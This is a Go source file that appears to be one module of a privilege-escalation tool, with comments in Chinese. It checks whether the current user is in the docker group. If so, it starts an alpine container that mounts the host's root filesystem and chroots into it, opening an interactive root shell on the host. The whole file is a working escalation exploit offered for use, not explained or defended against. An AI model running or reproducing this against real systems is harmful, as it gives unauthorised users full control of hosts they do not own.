package docker_sock

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

type Exploit struct{}

func isInDockerGroup() bool {
	cmd := exec.Command("id", "-nG") // 获取当前用户名所属的所有组（name）
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("获取用户组失败:", err)
		return false
	}
	groups := strings.Fields(string(output)) // 以空格切割
	for _, group := range groups {
		if group == "docker" {
			return true
		}
	}
	return false
}

func (e *Exploit) Run() {
	if isInDockerGroup() {
		fmt.Println("[!] docker.sock is writable")
		cmd := exec.Command("docker", "run", "-v", "/:/mnt", "--rm", "-it", "alpine", "chroot", "/mnt", "sh")
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		fmt.Println("[+] run docker container success")
		err := cmd.Run()
		if err != nil {
			fmt.Println("[-] run docker container fail")
		}
	}
}
